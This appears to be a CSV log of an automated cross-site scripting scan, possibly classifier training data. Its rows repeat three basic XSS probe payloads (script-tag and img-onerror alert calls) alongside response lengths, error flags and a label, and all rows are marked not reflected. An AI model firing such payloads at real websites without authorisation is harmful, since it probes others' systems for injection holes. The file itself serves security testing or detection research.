payload,payload_length,special_chars,is_reflected,response_length,error_detected,length_diff,label
<script>alert('XSS1')</script>,30,7,0,283716,1,0,0
"""><script>alert('XSS1')</script>",32,9,0,283725,1,0,0
<img src=x onerror=alert('XSS1')>,33,6,0,283719,1,0,0
<script>alert('XSS1')</script>,30,7,0,283764,1,0,0
"""><script>alert('XSS1')</script>",32,9,0,283769,1,0,0
<img src=x onerror=alert('XSS1')>,33,6,0,283768,1,0,0
<script>alert('XSS1')</script>,30,7,0,24214,0,0,0
"""><script>alert('XSS1')</script>",32,9,0,24214,0,0,0
<img src=x onerror=alert('XSS1')>,33,6,0,24214,0,0,0
<script>alert('XSS1')</script>,30,7,0,79213,1,0,0
"""><script>alert('XSS1')</script>",32,9,0,79223,1,0,0
<img src=x onerror=alert('XSS1')>,33,6,0,79215,1,0,0
<script>alert('XSS1')</script>,30,7,0,1551,1,0,0
"""><script>alert('XSS1')</script>",32,9,0,1551,1,0,0
<img src=x onerror=alert('XSS1')>,33,6,0,1551,1,0,0
<script>alert('XSS1')</script>,30,7,0,1254305,1,0,0
"""><script>alert('XSS1')</script>",32,9,0,1254309,1,0,0
<img src=x onerror=alert('XSS1')>,33,6,0,1254306,1,0,0
<script>alert('XSS1')</script>,30,7,0,1254307,1,0,0
"""><script>alert('XSS1')</script>",32,9,0,1254310,1,0,0
<img src=x onerror=alert('XSS1')>,33,6,0,1254310,1,0,0
<script>alert('XSS1')</script>,30,7,0,1254310,1,0,0
"""><script>alert('XSS1')</script>",32,9,0,1254309,1,0,0
<img src=x onerror=alert('XSS1')>,33,6,0,1254307,1,0,0
<script>alert('XSS1')</script>,30,7,0,1254309,1,0,0
"""><script>alert('XSS1')</script>",32,9,0,1254311,1,0,0
<img src=x onerror=alert('XSS1')>,33,6,0,1254308,1,0,0
<script>alert('XSS1')</script>,30,7,0,1551,1,0,0
"""><script>alert('XSS1')</script>",32,9,0,1551,1,0,0
<img src=x onerror=alert('XSS1')>,33,6,0,1551,1,0,0
<script>alert('XSS1')</script>,30,7,0,594273,1,0,0
"""><script>alert('XSS1')</script>",32,9,0,594273,1,0,0
<img src=x onerror=alert('XSS1')>,33,6,0,594272,1,0,0
<script>alert('XSS1')</script>,30,7,0,594271,1,0,0
"""><script>alert('XSS1')</script>",32,9,0,594271,1,0,0
<img src=x onerror=alert('XSS1')>,33,6,0,594273,1,0,0
<script>alert('XSS1')</script>,30,7,0,594272,1,0,0
"""><script>alert('XSS1')</script>",32,9,0,594273,1,0,0
<img src=x onerror=alert('XSS1')>,33,6,0,594272,1,0,0
<script>alert('XSS1')</script>,30,7,0,594271,1,0,0
"""><script>alert('XSS1')</script>",32,9,0,594273,1,0,0
<img src=x onerror=alert('XSS1')>,33,6,0,594271,1,0,0
<script>alert('XSS1')</script>,30,7,0,1551,1,0,0
"""><script>alert('XSS1')</script>",32,9,0,1551,1,0,0
<img src=x onerror=alert('XSS1')>,33,6,0,1551,1,0,0
<script>alert('XSS1')</script>,30,7,0,646411,1,0,0
"""><script>alert('XSS1')</script>",32,9,0,646411,1,0,0
<img src=x onerror=alert('XSS1')>,33,6,0,646408,1,0,0
<script>alert('XSS1')</script>,30,7,0,646410,1,0,0
"""><script>alert('XSS1')</script>",32,9,0,646410,1,0,0
<img src=x onerror=alert('XSS1')>,33,6,0,646411,1,0,0
<script>alert('XSS1')</script>,30,7,0,646410,1,0,0
"""><script>alert('XSS1')</script>",32,9,0,646411,1,0,0
<img src=x onerror=alert('XSS1')>,33,6,0,646411,1,0,0
<script>alert('XSS1')</script>,30,7,0,646411,1,0,0
"""><script>alert('XSS1')</script>",32,9,0,646412,1,0,0
<img src=x onerror=alert('XSS1')>,33,6,0,646412,1,0,0
<script>alert('XSS1')</script>,30,7,0,79275,1,0,0
"""><script>alert('XSS1')</script>",32,9,0,79284,1,0,0
<img src=x onerror=alert('XSS1')>,33,6,0,79273,1,0,0
<script>alert('XSS1')</script>,30,7,0,79274,1,0,0
"""><script>alert('XSS1')</script>",32,9,0,79284,1,0,0
<img src=x onerror=alert('XSS1')>,33,6,0,79282,1,0,0
<script>alert('XSS1')</script>,30,7,0,79268,1,0,0
"""><script>alert('XSS1')</script>",32,9,0,79278,1,0,0
<img src=x onerror=alert('XSS1')>,33,6,0,79271,1,0,0
<script>alert('XSS1')</script>,30,7,0,189855,1,0,0
"""><script>alert('XSS1')</script>",32,9,0,189855,1,0,0
<img src=x onerror=alert('XSS1')>,33,6,0,189855,1,0,0
<script>alert('XSS1')</script>,30,7,0,189855,1,0,0
"""><script>alert('XSS1')</script>",32,9,0,189855,1,0,0
<img src=x onerror=alert('XSS1')>,33,6,0,189855,1,0,0
<script>alert('XSS1')</script>,30,7,0,189855,1,0,0
"""><script>alert('XSS1')</script>",32,9,0,189855,1,0,0
<img src=x onerror=alert('XSS1')>,33,6,0,189855,1,0,0
<script>alert('XSS1')</script>,30,7,0,1551,1,0,0
"""><script>alert('XSS1')</script>",32,9,0,1551,1,0,0
<img src=x onerror=alert('XSS1')>,33,6,0,1551,1,0,0
<script>alert('XSS1')</script>,30,7,0,1254309,1,0,0
"""><script>alert('XSS1')</script>",32,9,0,1254311,1,0,0
<img src=x onerror=alert('XSS1')>,33,6,0,1254309,1,0,0
<script>alert('XSS1')</script>,30,7,0,1254310,1,0,0
"""><script>alert('XSS1')</script>",32,9,0,1254310,1,0,0
<img src=x onerror=alert('XSS1')>,33,6,0,1254310,1,0,0
<script>alert('XSS1')</script>,30,7,0,1254309,1,0,0
"""><script>alert('XSS1')</script>",32,9,0,1254311,1,0,0
<img src=x onerror=alert('XSS1')>,33,6,0,1254309,1,0,0
<script>alert('XSS1')</script>,30,7,0,1254311,1,0,0
"""><script>alert('XSS1')</script>",32,9,0,1254305,1,0,0
<img src=x onerror=alert('XSS1')>,33,6,0,1254307,1,0,0
<script>alert('XSS1')</script>,30,7,0,1551,1,0,0
"""><script>alert('XSS1')</script>",32,9,0,1551,1,0,0
<img src=x onerror=alert('XSS1')>,33,6,0,1551,1,0,0
<script>alert('XSS1')</script>,30,7,0,242428,1,0,0
"""><script>alert('XSS1')</script>",32,9,0,242424,1,0,0
<img src=x onerror=alert('XSS1')>,33,6,0,242425,1,0,0
<script>alert('XSS1')</script>,30,7,0,242427,1,0,0
"""><script>alert('XSS1')</script>",32,9,0,242427,1,0,0
<img src=x onerror=alert('XSS1')>,33,6,0,242426,1,0,0
<script>alert('XSS1')</script>,30,7,0,242427,1,0,0
"""><script>alert('XSS1')</script>",32,9,0,242426,1,0,0
<img src=x onerror=alert('XSS1')>,33,6,0,242426,1,0,0
<script>alert('XSS1')</script>,30,7,0,242425,1,0,0
"""><script>alert('XSS1')</script>",32,9,0,242426,1,0,0
<img src=x onerror=alert('XSS1')>,33,6,0,242425,1,0,0
<script>alert('XSS1')</script>,30,7,0,1551,1,0,0
"""><script>alert('XSS1')</script>",32,9,0,1551,1,0,0
<img src=x onerror=alert('XSS1')>,33,6,0,1551,1,0,0
<script>alert('XSS1')</script>,30,7,0,4105,0,0,0
"""><script>alert('XSS1')</script>",32,9,0,4105,0,0,0
<img src=x onerror=alert('XSS1')>,33,6,0,4105,0,0,0
<script>alert('XSS1')</script>,30,7,0,4105,0,0,0
"""><script>alert('XSS1')</script>",32,9,0,4105,0,0,0
<img src=x onerror=alert('XSS1')>,33,6,0,4105,0,0,0
<script>alert('XSS1')</script>,30,7,0,4105,0,0,0
"""><script>alert('XSS1')</script>",32,9,0,4105,0,0,0
<img src=x onerror=alert('XSS1')>,33,6,0,4105,0,0,0
<script>alert('XSS1')</script>,30,7,0,4105,0,0,0
"""><script>alert('XSS1')</script>",32,9,0,4105,0,0,0
<img src=x onerror=alert('XSS1')>,33,6,0,4105,0,0,0
<script>alert('XSS1')</script>,30,7,0,1551,1,0,0
"""><script>alert('XSS1')</script>",32,9,0,1551,1,0,0
<img src=x onerror=alert('XSS1')>,33,6,0,1551,1,0,0
<script>alert('XSS1')</script>,30,7,0,646411,1,0,0
"""><script>alert('XSS1')</script>",32,9,0,646410,1,0,0
<img src=x onerror=alert('XSS1')>,33,6,0,646410,1,0,0
<script>alert('XSS1')</script>,30,7,0,646412,1,0,0
"""><script>alert('XSS1')</script>",32,9,0,646411,1,0,0
<img src=x onerror=alert('XSS1')>,33,6,0,646411,1,0,0
<script>alert('XSS1')</script>,30,7,0,646412,1,0,0
"""><script>alert('XSS1')</script>",32,9,0,646410,1,0,0
<img src=x onerror=alert('XSS1')>,33,6,0,646411,1,0,0
<script>alert('XSS1')</script>,30,7,0,646411,1,0,0
"""><script>alert('XSS1')</script>",32,9,0,646411,1,0,0
<img src=x onerror=alert('XSS1')>,33,6,0,646411,1,0,0
<script>alert('XSS1')</script>,30,7,0,1551,1,0,0
"""><script>alert('XSS1')</script>",32,9,0,1551,1,0,0
<img src=x onerror=alert('XSS1')>,33,6,0,1551,1,0,0
<script>alert('XSS1')</script>,30,7,0,895690,1,0,0
"""><script>alert('XSS1')</script>",32,9,0,895728,1,0,0
<img src=x onerror=alert('XSS1')>,33,6,0,895722,1,0,0
<script>alert('XSS1')</script>,30,7,0,895448,1,0,0
"""><script>alert('XSS1')</script>",32,9,0,895557,1,0,0
<img src=x onerror=alert('XSS1')>,33,6,0,895455,1,0,0
<script>alert('XSS1')</script>,30,7,0,895265,1,0,0
"""><script>alert('XSS1')</script>",32,9,0,895275,1,0,0
<img src=x onerror=alert('XSS1')>,33,6,0,895679,1,0,0
<script>alert('XSS1')</script>,30,7,0,895730,1,0,0
"""><script>alert('XSS1')</script>",32,9,0,895287,1,0,0
<img src=x onerror=alert('XSS1')>,33,6,0,895282,1,0,0
<script>alert('XSS1')</script>,30,7,0,1551,1,0,0
"""><script>alert('XSS1')</script>",32,9,0,1551,1,0,0
<img src=x onerror=alert('XSS1')>,33,6,0,1551,1,0,0
<script>alert('XSS1')</script>,30,7,0,594273,1,0,0
"""><script>alert('XSS1')</script>",32,9,0,594273,1,0,0
